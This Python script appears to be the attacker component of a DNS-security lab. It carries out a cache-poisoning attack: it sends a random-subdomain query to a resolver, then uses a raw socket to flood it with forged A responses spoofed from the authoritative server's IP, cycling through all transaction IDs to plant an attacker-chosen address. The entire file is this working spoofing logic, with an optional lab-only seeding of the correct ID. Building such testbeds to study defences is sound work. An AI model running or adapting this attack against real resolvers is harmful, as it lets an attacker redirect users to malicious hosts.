from __future__ import annotations

import json
import os
from pathlib import Path
import signal
import socket
import time

from attacker.attack_utils import build_dns_query
from attacker.attack_utils import build_nsd_template_forged_a_response_builder
from attacker.attack_utils import build_real_shaped_forged_a_response_builder
from attacker.scapy_utils import build_ipv4_udp_packet
from attacker.txid_seed import clear_attack_query_txid
from attacker.txid_seed import wait_for_attack_query_txid


running = True
DNS_PORT = 53


def create_spoofed_txids(valid_txid: int | None, valid_txid_position: int | None):
    if valid_txid is None or valid_txid_position is None:
        return list(range(1 << 16))

    txids: list[int] = []
    next_txid = 0
    for packet_index in range(1 << 16):
        if packet_index == valid_txid_position - 1:
            txids.append(valid_txid)
            continue

        while next_txid == valid_txid:
            next_txid += 1

        txids.append(next_txid)
        next_txid += 1

    return txids


def stop(signum, frame):
    global running
    running = False


def run_attack():
    resolver_ip = os.environ["RESOLVER_IP"]
    authoritative_ip = os.environ["AUTHORITATIVE_IP"]
    target_zone = os.environ["ATTACK_TARGET_ZONE"]
    forged_answer_ip = os.environ["FORGED_ANSWER_IP"]
    resolver_outgoing_port = int(os.environ["RESOLVER_FIXED_OUTGOING_PORT"])
    per_packet_delay_seconds = float(os.environ["ATTACK_PACKET_DELAY_SECONDS"])
    max_spoofed_packets = int(os.environ["ATTACK_MAX_SPOOFED_PACKETS"])
    valid_txid_position = int(os.environ["ATTACK_VALID_TXID_POSITION"])
    valid_txid_wait_seconds = float(os.environ["ATTACK_VALID_TXID_WAIT_SECONDS"])
    coordination_dir = Path(os.environ["ATTACK_TXID_COORDINATION_DIR"])
    query_name = os.environ.get("ATTACK_QUERY_NAME") or f"{os.urandom(8).hex()}.{target_zone}"
    if valid_txid_position is not None and not 1 <= valid_txid_position <= (1 << 16):
        raise ValueError("ATTACK_VALID_TXID_POSITION must be between 1 and 65536")
    if not 1 <= max_spoofed_packets <= (1 << 16):
        raise ValueError("ATTACK_MAX_SPOOFED_PACKETS must be between 1 and 65536")

    query_txid = int.from_bytes(os.urandom(2), "big")
    query_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if valid_txid_position is not None:
        clear_attack_query_txid(coordination_dir)
    query_socket.sendto(build_dns_query(query_txid, query_name), (resolver_ip, DNS_PORT))
    matching_resolver_txid = None
    if valid_txid_position is not None:
        matching_resolver_txid = wait_for_attack_query_txid(
            coordination_dir,
            query_name,
            valid_txid_wait_seconds,
        )

    response_shape = "real-shaped"
    if query_name == "app.lab.dnshield":
        build_response = build_nsd_template_forged_a_response_builder(
            query_name,
            forged_answer_ip,
        )
        response_shape = "nsd-template"
    else:
        build_response = build_real_shaped_forged_a_response_builder(
            query_name,
            target_zone,
            authoritative_ip,
            forged_answer_ip,
        )

    txids_to_send = list(
        create_spoofed_txids(
            matching_resolver_txid,
            valid_txid_position,
        )
    )[:max_spoofed_packets]

    spoofed_packets_sent = 0
    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    destination = (resolver_ip, 0)
    for forged_txid in txids_to_send:
        packet_bytes = build_ipv4_udp_packet(
            src_ip=authoritative_ip,
            dst_ip=resolver_ip,
            src_port=DNS_PORT,
            dst_port=resolver_outgoing_port,
            udp_payload=build_response(forged_txid),
        )
        raw_socket.sendto(packet_bytes, destination)
        spoofed_packets_sent += 1
        if per_packet_delay_seconds > 0:
            time.sleep(per_packet_delay_seconds)

    seeded_text = ""
    if valid_txid_position is not None and matching_resolver_txid is not None:
        seeded_text = (
            f" with seeded valid resolver txid {matching_resolver_txid} "
            f"at forged packet position {valid_txid_position}"
        )
    print(
        "attacker sent 1 random-subdomain query for "
        f"{query_name} and {spoofed_packets_sent} forged {response_shape} A responses for {query_name} "
        f"to {forged_answer_ip} "
        f"with {per_packet_delay_seconds:.6f}s pacing"
        f"{seeded_text}",
        flush=True,
    )
    print(
        json.dumps(
            {
                "event": "attacker_summary",
                "query_name": query_name,
                "spoofed_packets_sent": spoofed_packets_sent,
            }
        ),
        flush=True,
    )
    raw_socket.close()
    query_socket.close()


def main():
    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)

    print("attacker container ready", flush=True)
    run_attack()

    if os.environ.get("ATTACK_EXIT_AFTER_RUN") == "1":
        print("attacker container exiting after attack run", flush=True)
        return

    while running:
        time.sleep(3600)

    print("attacker container stopping", flush=True)


if __name__ == "__main__":
    main()
